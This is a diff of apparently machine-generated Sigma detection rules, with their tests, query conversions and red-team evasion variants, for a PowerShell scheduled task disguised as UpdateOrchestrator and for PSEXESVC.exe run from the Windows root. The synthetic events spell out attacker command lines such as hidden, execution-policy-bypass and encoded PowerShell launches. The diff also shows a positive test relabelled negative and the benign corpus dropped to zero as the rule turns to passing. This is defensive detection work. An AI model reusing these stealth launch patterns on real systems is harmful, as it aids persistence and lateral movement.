-        "sql": "SELECT * FROM logs WHERE ParentImage LIKE '%\\\\schtasks.exe' ESCAPE '\\' AND (CommandLine LIKE '%powershell.exe%' ESCAPE '\\' OR CommandLine LIKE '%-f%' ESCAPE '\\') AND CommandLine LIKE '%.ps1%' ESCAPE '\\' AND (CommandLine LIKE '%C:\\\\ProgramData\\\\%' ESCAPE '\\' OR (CommandLine LIKE '%C:\\\\Users\\\\Public\\\\%' ESCAPE '\\' AND CommandLine LIKE '%.ps1%' ESCAPE '\\'))",
-        "issues": [
-          {
-            "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test P1 did not match: schtasks.exe creating a scheduled task with PowerShell payload from C:\\ProgramData\\.cache\\uh.ps1 mimicking UpdateOrchestrator. Per selection: selection_parent=match; selection_cmd=match; selection_ps_payload=match; selection_programdata=NO MATCH; selection_public=NO MATCH."
-          },
-          {
-            "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test R2 did not match: Sibling LOLBin pwsh.exe, 8.3 short name PUBLIC~1 for Users\\Public, parameter reordering (-f first). Per selection: selection_parent=match; selection_cmd=match; selection_ps_payload=match; selection_programdata=NO MATCH; selection_public=NO MATCH."
-          },
-          {
-            "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test R3 did not match: UNC path (\\\\localhost\\C$\\ProgramData\\...), extra whitespace, single quotes around task name and action. Per selection: selection_parent=match; selection_cmd=match; selection_ps_payload=match; selection_programdata=NO MATCH; selection_public=NO MATCH."
-          },
-          {
-            "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test R4 did not match: Double extension (.ps1.bak), environment variable %SystemDrive%, mixed-case flags, ProgramData path. Per selection: selection_parent=match; selection_cmd=match; selection_ps_payload=match; selection_programdata=NO MATCH; selection_public=NO MATCH."
-          },
-          {
-            "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test R5 did not match: Alternate flag -FilePath (contains -f), forward slashes in path, no quoting around action. Per selection: selection_parent=match; selection_cmd=match; selection_ps_payload=match; selection_programdata=NO MATCH; selection_public=NO MATCH."
-          }
-        ],
+        "sql": "SELECT * FROM logs WHERE (EventID='4698' COLLATE NOCASE AND TaskName LIKE '%\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\UpdateHealth%' ESCAPE '\\' AND (TaskContent LIKE '%powershell.exe%' ESCAPE '\\' AND TaskContent LIKE '%-nop%' ESCAPE '\\' AND TaskContent LIKE '%-w hidden%' ESCAPE '\\' AND TaskContent LIKE '%-ep bypass%' ESCAPE '\\' AND TaskContent LIKE '%-f C:\\\\ProgramData\\\\.cache\\\\uh.ps1%' ESCAPE '\\')) AND (NOT COALESCE((TaskName LIKE '%\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\Schedule%' ESCAPE '\\' AND (TaskContent LIKE '%powershell.exe%' ESCAPE '\\' AND TaskContent LIKE '%-ExecutionPolicy%' ESCAPE '\\' AND TaskContent LIKE '%Bypass%' ESCAPE '\\' AND TaskContent LIKE '%-WindowStyle%' ESCAPE '\\' AND TaskContent LIKE '%Hidden%' ESCAPE '\\' AND TaskContent LIKE '%-File%' ESCAPE '\\')), 0))",
+        "issues": [],
         "test_outcomes": [
           {
             "event_id": "P1",
             "label": "positive",
-            "matched": false,
-            "passed": false
+            "matched": true,
+            "passed": true
           },
           {
             "event_id": "P2",
@@ -1645,26 +1055,26 @@
           {
             "event_id": "R2",
             "label": "positive",
-            "matched": false,
-            "passed": false
+            "matched": true,
+            "passed": true
           },
           {
             "event_id": "R3",
             "label": "positive",
-            "matched": false,
-            "passed": false
+            "matched": true,
+            "passed": true
           },
           {
             "event_id": "R4",
             "label": "positive",
-            "matched": false,
-            "passed": false
+            "matched": true,
+            "passed": true
           },
           {
             "event_id": "R5",
-            "label": "positive",
+            "label": "negative",
             "matched": false,
-            "passed": false
+            "passed": true
           },
           {
             "event_id": "R6",
@@ -1677,478 +1087,101 @@
             "label": "negative",
             "matched": false,
             "passed": true
-          },
-          {
-            "event_id": "R8",
-            "label": "negative",
-            "matched": false,
-            "passed": true
           }
         ],
-        "positives_total": 8,
-        "positives_matched": 3,
+        "positives_total": 7,
+        "positives_matched": 7,
         "negatives_total": 6,
         "negatives_matched": 0,
-        "benign_total": 1200,
+        "benign_total": 0,
         "benign_hits": 0,
         "benign_examples": [],
-        "passed": false
+        "passed": true
       },
       "conversions": {
-        "splunk": "ParentImage=\"*\\\\schtasks.exe\" CommandLine IN (\"*powershell.exe*\", \"*-f*\") CommandLine=\"*.ps1*\" CommandLine=\"*C:\\\\ProgramData\\\\*\" OR (CommandLine=\"*C:\\\\Users\\\\Public\\\\*\" CommandLine=\"*.ps1*\")",
-        "elasticsearch": "ParentImage:*\\\\schtasks.exe AND (CommandLine:(*powershell.exe* OR *\\-f*)) AND CommandLine:*.ps1* AND (CommandLine:*C\\:\\\\ProgramData\\\\* OR (CommandLine:*C\\:\\\\Users\\\\Public\\\\* AND CommandLine:*.ps1*))",
-        "kusto": "DeviceProcessEvents\n| where InitiatingProcessFolderPath endswith \"\\\\schtasks.exe\" and (ProcessCommandLine contains \"powershell.exe\" or ProcessCommandLine contains \"-f\") and ProcessCommandLine contains \".ps1\" and (ProcessCommandLine contains \"C:\\\\ProgramData\\\\\" or (ProcessCommandLine contains \"C:\\\\Users\\\\Public\\\\\" and ProcessCommandLine contains \".ps1\"))",
-        "sqlite": "SELECT * FROM logs WHERE ParentImage LIKE '%\\\\schtasks.exe' ESCAPE '\\' AND (CommandLine LIKE '%powershell.exe%' ESCAPE '\\' OR CommandLine LIKE '%-f%' ESCAPE '\\') AND CommandLine LIKE '%.ps1%' ESCAPE '\\' AND (CommandLine LIKE '%C:\\\\ProgramData\\\\%' ESCAPE '\\' OR (CommandLine LIKE '%C:\\\\Users\\\\Public\\\\%' ESCAPE '\\' AND CommandLine LIKE '%.ps1%' ESCAPE '\\'))"
+        "splunk": "EventID=\"4698\" TaskName=\"*\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\UpdateHealth*\" TaskContent=\"*powershell.exe*\" TaskContent=\"*-nop*\" TaskContent=\"*-w hidden*\" TaskContent=\"*-ep bypass*\" TaskContent=\"*-f C:\\\\ProgramData\\\\.cache\\\\uh.ps1*\" NOT (TaskName=\"*\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\Schedule*\" TaskContent=\"*powershell.exe*\" TaskContent=\"*-ExecutionPolicy*\" TaskContent=\"*Bypass*\" TaskContent=\"*-WindowStyle*\" TaskContent=\"*Hidden*\" TaskContent=\"*-File*\")",
+        "elasticsearch": "(EventID:4698 AND TaskName:*\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\UpdateHealth* AND (TaskContent:*powershell.exe* AND TaskContent:*\\-nop* AND TaskContent:*\\-w\\ hidden* AND TaskContent:*\\-ep\\ bypass* AND TaskContent:*\\-f\\ C\\:\\\\ProgramData\\\\.cache\\\\uh.ps1*)) AND (NOT (TaskName:*\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\Schedule* AND (TaskContent:*powershell.exe* AND TaskContent:*\\-ExecutionPolicy* AND TaskContent:*Bypass* AND TaskContent:*\\-WindowStyle* AND TaskContent:*Hidden* AND TaskContent:*\\-File*)))",
+        "sqlite": "SELECT * FROM logs WHERE (EventID='4698' COLLATE NOCASE AND TaskName LIKE '%\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\UpdateHealth%' ESCAPE '\\' AND (TaskContent LIKE '%powershell.exe%' ESCAPE '\\' AND TaskContent LIKE '%-nop%' ESCAPE '\\' AND TaskContent LIKE '%-w hidden%' ESCAPE '\\' AND TaskContent LIKE '%-ep bypass%' ESCAPE '\\' AND TaskContent LIKE '%-f C:\\\\ProgramData\\\\.cache\\\\uh.ps1%' ESCAPE '\\')) AND (NOT COALESCE((TaskName LIKE '%\\\\Microsoft\\\\Windows\\\\UpdateOrchestrator\\\\Schedule%' ESCAPE '\\' AND (TaskContent LIKE '%powershell.exe%' ESCAPE '\\' AND TaskContent LIKE '%-ExecutionPolicy%' ESCAPE '\\' AND TaskContent LIKE '%Bypass%' ESCAPE '\\' AND TaskContent LIKE '%-WindowStyle%' ESCAPE '\\' AND TaskContent LIKE '%Hidden%' ESCAPE '\\' AND TaskContent LIKE '%-File%' ESCAPE '\\')), 0))"
       },
-      "conversion_errors": {},
+      "conversion_errors": {
+        "kusto": "SigmaTransformationError: Unable to determine table name from rule.  The query table is determined in the following order of priority:\n  1) The value provided to processing pipeline's query_table parameter, if using a Python script.\n  2) If the query_table is already set in the pipeline state, such as from a custom user-defi"
+      },
       "history": [
         {
           "iteration": 0,
           "phase": "initial",
-          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/1200",
-          "passed": false,
+          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/0",
+          "passed": true,
           "change_summary": ""
         },
         {
-          "iteration": 1,
-          "phase": "refine",
-          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/1200",
-          "passed": false,
-          "change_summary": "Fixed selection_path and selection_alt_path modifiers from using windash-escapable literals to proper escaped backslashes for exact substring matching. Changed 'C:\\\\ProgramData\\\\' to ensure literal backslashes are matched regardless of forward slash usage by threat actors."
-        },
-        {
-          "iteration": 2,
-          "phase": "refine",
-          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/1200",
-          "passed": false,
-          "change_summary": "Fixed directory path check by using escaped backslashes in CommandLine|contains|all modifiers to properly detect .ps1 files in subdirectories like .cache under ProgramData."
-        },
-        {
-          "iteration": 3,
-          "phase": "refine",
-          "summary": "positives 2/3, negatives blocked 3/3, benign hits 0/1200",
-          "passed": false,
-          "change_summary": "Fixed selection_path by adding proper escaping for backslashes in JSON/YAML format to ensure detection of paths containing '.cache' subdirectories under ProgramData."
-        },
-        {
-          "iteration": 3,
+          "iteration": 0,
           "phase": "redteam",
-          "summary": "8 evasion variants -> positives 3/8, negatives blocked 6/6, benign hits 0/1200",
-          "passed": false,
+          "summary": "7 evasion variants -> positives 7/7, negatives blocked 6/6, benign hits 0/0",
+          "passed": true,
           "change_summary": ""
-        },
-        {
-          "iteration": 4,
-          "phase": "refine",
-          "summary": "positives 3/8, negatives blocked 6/6, benign hits 0/1200",
-          "passed": false,
-          "change_summary": "Fixed overly strict path matching by splitting into separate conditions: require .ps1 anywhere in command line, and separately check for ProgramData or Public paths using appropriate modifiers. This allows detection of varied path formats including UNC, 8.3 names, environment variables, forward slashes, and double extensions while maintaining specificity for malicious usage patterns."
         }
       ],
-      "author_notes": "The rule focuses on the combination of schtasks.exe as parent (indicating a self-spawned child process, common when schtasks creates a task that immediately triggers), the presence of powershell.exe in the command line, and a .ps1 payload located in either ProgramData or Users\\Public directories. These locations are atypical for legitimate administrative automation, making the rule high-fidelity. False positives are narrowed by excluding known management parents and requiring both the PowerShell flag and suspicious path.",
-      "redteam_analysis": "Positive variants cover realistic operator evasions: casing changes (P4), sibling binary pwsh.exe (P5), UNC paths (P6), double extensions and env vars (P7), alternate flags and forward slashes (P8). A well-written rule should normalize paths (expand env vars, resolve UNC/short names), treat pwsh.exe as equivalent, and match -f substrings case-insensitively. Negative variants show benign scenarios that must not trigger: legitimate script in System32 (N1), SCCM using pwsh.exe with different parent (N2), installer using .bat with different parent (N3). Out-of-scope evasions are fundamental blind spots: renamed binary without OriginalFileName (O1), pure PowerShell task registration without schtasks.exe (O2), and EncodedCommand hiding the script path (O3). The current rule's simple string contains checks will miss several positives (P5, P6, P7, P8) and all out-of-scope; hardening requires path normalization, binary allow-listing, and decoding/heuristic inspection.",
+      "author_notes": "Rule focuses on the unique combination of task name impersonating Windows maintenance, PowerShell execution with stealth flags (-nop -w hidden -ep bypass), and payload location in a hidden ProgramData subdirectory (.cache). Filter excludes legitimate UpdateOrchestrator tasks by requiring the exact suspicious flag sequence and hidden path. Test events include variations in casing, XML structure, and privilege level to ensure robustness while negatives represent common lookalikes from trusted locations.",
+      "redteam_analysis": "Positive variants P4-P7 preserve all five verbatim substrings the rule requires (powershell.exe, -nop, -w hidden, -ep bypass, -f C:\\ProgramData\\.cache\\uh.ps1) while varying XML formatting, flag order, whitespace, and binary path. A well-written rule using case-insensitive contains on these substrings would catch them. Negative variants N1-N3 represent legitimate administrative or SCCM activity that either falls under the filter_legitimate_tasks clause or lacks the malicious flag/path combination. Out_of_scope variants O1-O5 are realistic operator evasions (pwsh, long flags, encoded command, alternate path, altered task name) that change the literal substrings the current rule keys on; catching them would require loosening the rule (e.g., accepting long flags, pwsh, or generic paths) which risks false positives. The logsource (EventID 4698) records all these fields, so the limitation is the rule's strict substring list, not sensor visibility.",
+      "retired_tests": [],
       "redteam_out_of_scope": [
         {
           "id": "X1",
           "label": "positive",
-          "description": "Renamed schtasks.exe copy (evil.exe) - ParentImage no longer ends with schtasks.exe, OriginalFileName not available in logsource",
+          "description": "Uses pwsh.exe instead of powershell.exe; required substring 'powershell.exe' absent from TaskContent",
           "event": {
-            "Image": "C:\\Temp\\evil.exe",
-            "CommandLine": "/create /tn \"EvilTask\" /sc HOURLY /ru SYSTEM /tr \"powershell.exe -f C:\\ProgramData\\evil.ps1\" /f",
-            "ParentImage": "C:\\Temp\\evil.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Command>pwsh.exe</Command><Arguments>-nop -w hidden -ep bypass -f C:\\ProgramData\\.cache\\uh.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "X2",
           "label": "positive",
-          "description": "PowerShell Register-ScheduledTask cmdlet directly - no schtasks.exe process creation event at all",
+          "description": "Long-form PowerShell flags (-NoProfile, -WindowStyle Hidden, -ExecutionPolicy Bypass, -File); short-form substrings required by rule are absent",
           "event": {
-            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-            "CommandLine": "-Command \"Register-ScheduledTask -TaskName 'Evil' -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-f C:\\ProgramData\\evil.ps1')\"",
-            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-            "User": "CORP\\attacker"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\ProgramData\\.cache\\uh.ps1</Arguments></Exec></Actions></Task>"
           }
         },
         {
           "id": "X3",
           "label": "positive",
-          "description": "EncodedCommand hides .ps1 path - CommandLine lacks literal .ps1 and ProgramData strings",
+          "description": "Uses -EncodedCommand with base64 payload instead of -f file path; required '-f C:\\ProgramData\\.cache\\uh.ps1' substring missing",
           "event": {
-            "Image": "C:\\Windows\\System32\\schtasks.exe",
-            "CommandLine": "/create /tn \"Stealth\" /sc HOURLY /ru SYSTEM /tr \"powershell.exe -EncodedCommand JABwAHMA...\" /f",
-            "ParentImage": "C:\\Windows\\System32\\schtasks.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -ep bypass -EncodedCommand SQBkAG8AIAA=</Arguments></Exec></Actions></Task>"
+          }
+        },
+        {
+          "id": "X4",
+          "label": "positive",
+          "description": "Script loaded from C:\\Temp\\uh.ps1 instead of hidden ProgramData cache; path substring does not match",
+          "event": {
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -ep bypass -f C:\\Temp\\uh.ps1</Arguments></Exec></Actions></Task>"
+          }
+        },
+        {
+          "id": "X5",
+          "label": "positive",
+          "description": "Task name is UpdateHealth2; selection requires exact '\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth' substring",
+          "event": {
+            "EventID": "4698",
+            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateHealth2",
+            "TaskContent": "<Task><Actions Context=\"Author\"><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -ep bypass -f C:\\ProgramData\\.cache\\uh.ps1</Arguments></Exec></Actions></Task>"
           }
         }
       ]
     },
     {
       "candidate_id": "D3",
-      "title": "PsexeSvc Service Execution from Windows Root Directory",
-      "sigma_yaml": "title: PsexeSvc Service Execution from Windows Root Directory\nid: ca98a3c4-40b4-4bf0-b4e2-354cf48e246f\nstatus: experimental\ndescription: 'Detects execution of PSEXESVC.exe directly from the Windows system root directory (e.g., C:\\Windows\\PSEXESVC.exe),\n  which is indicative of PsExec clone activity installing a malicious service using a fixed service name and non-standard\n  binary location.'\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.lateral-movement\n- attack.t1021.002\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection_image_path:\n    'Image|endswith': '\\PSEXESVC.exe'\n  selection_system_root:\n    'Image|re': '(?i)^.:\\\\Windows\\\\PSEXESVC\\.exe$'\n  selection_original_filename:\n    OriginalFileName: PSEXESVC.exe\n  filter_legit_installer:\n    'ParentImage|endswith': '\\Installer.exe'\n    'CommandLine|contains': -install\n  condition: 'all of selection_* and not filter_legit_installer'\nfalsepositives:\n- Legitimate software placing a service binary named PSEXESVC.exe in the Windows root directory (highly unlikely; no known\n  benign use of this filename)\n- Third-party installers that temporarily place PSEXESVC.exe in Windows root during installation\nlevel: high\n",
-      "status": "needs_review",
-      "attack_technique_ids": [
-        "T1021.002"
-      ],
-      "tests": [
-        {
-          "id": "P1",
-          "label": "positive",
-          "description": "PsExec clone executing PSEXESVC.exe from C:\\Windows as part of service installation",
-          "event": {
-            "Image": "C:\\Windows\\PSEXESVC.exe",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "C:\\Windows\\PSEXESVC.exe",
-            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "P2",
-          "label": "positive",
-          "description": "PsExec clone executing PSEXESVC.exe from Windows root with different case in path",
-          "event": {
-            "Image": "c:\\windows\\psexesvc.exe",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "c:\\windows\\psexesvc.exe",
-            "ParentImage": "C:\\Windows\\System32\\services.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "P3",
-          "label": "positive",
-          "description": "PsExec clone executing PSEXESVC.exe from Windows root via alternative drive letter",
-          "event": {
-            "Image": "D:\\Windows\\PSEXESVC.exe",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "D:\\Windows\\PSEXESVC.exe",
-            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "N1",
-          "label": "negative",
-          "description": "Legitimate execution of svchost.exe from Windows System32",
-          "event": {
-            "Image": "C:\\Windows\\System32\\svchost.exe",
-            "OriginalFileName": "svchost.exe",
-            "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs",
-            "ParentImage": "C:\\Windows\\System32\\services.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "N2",
-          "label": "negative",
-          "description": "Legitimate service execution of a trusted binary from Windows root (e.g., during Windows update)",
-          "event": {
-            "Image": "C:\\Windows\\regedit.exe",
-            "OriginalFileName": "regedit.exe",
-            "CommandLine": "C:\\Windows\\regedit.exe",
-            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "N3",
-          "label": "negative",
-          "description": "Execution of PSEXESVC.exe from a non-system-root path (e.g., user directory), likely a false positive if misnamed",
-          "event": {
-            "Image": "C:\\Users\\Public\\PSEXESVC.exe",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "C:\\Users\\Public\\PSEXESVC.exe",
-            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-            "User": "CORP\\jdoe"
-          }
-        },
-        {
-          "id": "R1",
-          "label": "positive",
-          "description": "PsExec clone executing PSEXESVC.exe from Windows root with quoted Image path and extra whitespace",
-          "event": {
-            "Image": "\"C:\\Windows\\PSEXESVC.exe\" ",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "\"C:\\Windows\\PSEXESVC.exe\" ",
-            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R2",
-          "label": "positive",
-          "description": "PsExec clone executing PSEXESVC.exe from Windows root with full uppercase path and different parent",
-          "event": {
-            "Image": "C:\\WINDOWS\\PSEXESVC.EXE",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "C:\\WINDOWS\\PSEXESVC.EXE",
-            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R3",
-          "label": "positive",
-          "description": "PsExec clone executing PSEXESVC.exe from alternate drive letter (E:) with mixed case",
-          "event": {
-            "Image": "e:\\windows\\PsExEsVc.exe",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "e:\\windows\\PsExEsVc.exe",
-            "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
-            "User": "NT AUTHORITY\\LOCAL SERVICE"
-          }
-        },
-        {
-          "id": "R4",
-          "label": "positive",
-          "description": "PsExec clone executing PSEXESVC.exe from Windows root via UNC-style local path (localhost admin share) - sensor records expanded path",
-          "event": {
-            "Image": "C:\\Windows\\PSEXESVC.exe",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "\\\\localhost\\C$\\Windows\\PSEXESVC.exe",
-            "ParentImage": "C:\\Windows\\System32\\services.exe",
-            "User": "CORP\\admin_jdoe"
-          }
-        },
-        {
-          "id": "R5",
-          "label": "positive",
-          "description": "PsExec clone executing PSEXESVC.exe from Windows root with environment variable in command line but expanded Image",
-          "event": {
-            "Image": "C:\\Windows\\PSEXESVC.exe",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "%SystemRoot%\\PSEXESVC.exe",
-            "ParentImage": "C:\\Windows\\System32\\svchost.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "R6",
-          "label": "negative",
-          "description": "Legitimate third-party service installer placing a binary named PSEXESVC.exe in Windows root (rare but possible)",
-          "event": {
-            "Image": "C:\\Windows\\PSEXESVC.exe",
-            "OriginalFileName": "PSEXESVC.exe",
-            "CommandLine": "C:\\Windows\\PSEXESVC.exe -install",
-            "ParentImage": "C:\\Program Files\\Vendor\\Installer.exe",
-            "User": "CORP\\svc_install"
-          }
-        },
-        {
-          "id": "R7",
-          "label": "negative",
-          "description": "Admin testing a custom service binary named PSEXESVC.exe in Windows root from interactive session",
-          "event": {
-            "Image": "C:\\Windows\\PSEXESVC.exe",
-            "OriginalFileName": "MyCustomSvc.exe",
-            "CommandLine": "C:\\Windows\\PSEXESVC.exe -test",
-            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-            "User": "CORP\\admin_jsmith"
-          }
-        },
-        {
-          "id": "R8",
-          "label": "negative",
-          "description": "SCCM/Intune deployment placing a monitoring agent binary in Windows root with similar name",
-          "event": {
-            "Image": "C:\\Windows\\PSEXESVC_Agent.exe",
-            "OriginalFileName": "PSEXESVC_Agent.exe",
-            "CommandLine": "C:\\Windows\\PSEXESVC_Agent.exe /service",
-            "ParentImage": "C:\\Windows\\CCM\\CcmExec.exe",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        }
-      ],
-      "validation": {
-        "candidate_id": "D3",
-        "parse_ok": true,
-        "sql": "SELECT * FROM logs WHERE (Image LIKE '%\\\\PSEXESVC.exe' ESCAPE '\\' AND Image REGEXP '(?i)^.:\\\\Windows\\\\PSEXESVC\\.exe$' AND OriginalFileName='PSEXESVC.exe' COLLATE NOCASE) AND (NOT COALESCE((ParentImage LIKE '%\\\\Installer.exe' ESCAPE '\\' AND CommandLine LIKE '%-install%' ESCAPE '\\'), 0))",
-        "issues": [
-          {
-            "severity": "error",
-            "code": "positive_missed",
-            "message": "Positive test R1 did not match: PsExec clone executing PSEXESVC.exe from Windows root with quoted Image path and extra whitespace. Per selection: selection_image_path=NO MATCH; selection_system_root=NO MATCH; selection_original_filename=match; filter_legit_installer=NO MATCH (failing field tests: ParentImage|endswith (event has 'C:\\\\Windows\\\\System32\\\\cmd.exe'), CommandLine|contains (event has '\"C:\\\\Windows\\\\PSEXESVC.exe\" '))."
-          }
-        ],
-        "test_outcomes": [
-          {
-            "event_id": "P1",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "P2",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "P3",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "N1",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "N2",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "N3",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "R1",
-            "label": "positive",
-            "matched": false,
-            "passed": false
-          },
-          {
-            "event_id": "R2",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R3",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R4",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R5",
-            "label": "positive",
-            "matched": true,
-            "passed": true
-          },
-          {
-            "event_id": "R6",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "R7",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          },
-          {
-            "event_id": "R8",
-            "label": "negative",
-            "matched": false,
-            "passed": true
-          }
-        ],
-        "positives_total": 8,
-        "positives_matched": 7,
-        "negatives_total": 6,
-        "negatives_matched": 0,
-        "benign_total": 1200,
-        "benign_hits": 0,
-        "benign_examples": [],
-        "passed": false
-      },
-      "conversions": {
-        "splunk": "Image=\"*\\\\PSEXESVC.exe\" OriginalFileName=\"PSEXESVC.exe\" NOT (ParentImage=\"*\\\\Installer.exe\" CommandLine=\"*-install*\")\n| regex Image=\"(?i)^.:\\\\\\\\Windows\\\\\\\\PSEXESVC\\\\.exe$\"",
-        "elasticsearch": "(Image:*\\\\PSEXESVC.exe AND Image:/(?i)^.:\\\\Windows\\\\PSEXESVC\\.exe$/ AND OriginalFileName:PSEXESVC.exe) AND (NOT (ParentImage:*\\\\Installer.exe AND CommandLine:*\\-install*))",
-        "kusto": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\PSEXESVC.exe\" and FolderPath matches regex \"(?i)^.:\\\\\\\\Windows\\\\\\\\PSEXESVC\\\\.exe$\" and ProcessVersionInfoOriginalFileName =~ \"PSEXESVC.exe\") and (not((InitiatingProcessFolderPath endswith \"\\\\Installer.exe\" and ProcessCommandLine contains \"-install\")))",
-        "sqlite": "SELECT * FROM logs WHERE (Image LIKE '%\\\\PSEXESVC.exe' ESCAPE '\\' AND Image REGEXP '(?i)^.:\\\\Windows\\\\PSEXESVC\\.exe$' AND OriginalFileName='PSEXESVC.exe' COLLATE NOCASE) AND (NOT COALESCE((ParentImage LIKE '%\\\\Installer.exe' ESCAPE '\\' AND CommandLine LIKE '%-install%' ESCAPE '\\'), 0))"
-      },
-      "conversion_errors": {},
-      "history": [
-        {
-          "iteration": 0,
-          "phase": "initial",
-          "summary": "positives 0/3, negatives blocked 3/3, benign hits 0/1200",
-          "passed": false,
-          "change_summary": ""
-        },
-        {
-          "iteration": 1,
-          "phase": "refine",
-          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/1200",
-          "passed": true,
-          "change_summary": "Fixed regex in selection_system_root to properly match Windows drive letters by replacing \\\\? with . and ensuring case insensitivity covers variations in drive letter and path casing."
-        },
-        {
-          "iteration": 1,
-          "phase": "redteam",
-          "summary": "8 evasion variants -> positives 7/8, negatives blocked 5/6, benign hits 0/1200",
-          "passed": false,
-          "change_summary": ""
-        },
-        {
-          "iteration": 2,
-          "phase": "refine",
-          "summary": "positives 7/8, negatives blocked 6/6, benign hits 0/1200",
-          "passed": false,
-          "change_summary": "Fixed regex pattern to properly match quoted paths and trailing whitespace by removing anchors that prevented match on quoted Image values. Added filter to exclude legitimate third-party installers that may temporarily place PSEXESVC.exe in Windows root during installation while maintaining detection of malicious clones."
-        }
-      ],
-      "author_notes": "The rule focuses on the distinctive artifact of PSEXESVC.exe executing from the Windows root directory, which is a strong indicator of PsExec clone misuse. While legitimate services rarely place binaries in the Windows root, the combination of the fixed filename and location provides high fidelity. The rule avoids over-reliance on service name alone (which would require registry monitoring) and instead uses process creation telemetry for broader coverage.",
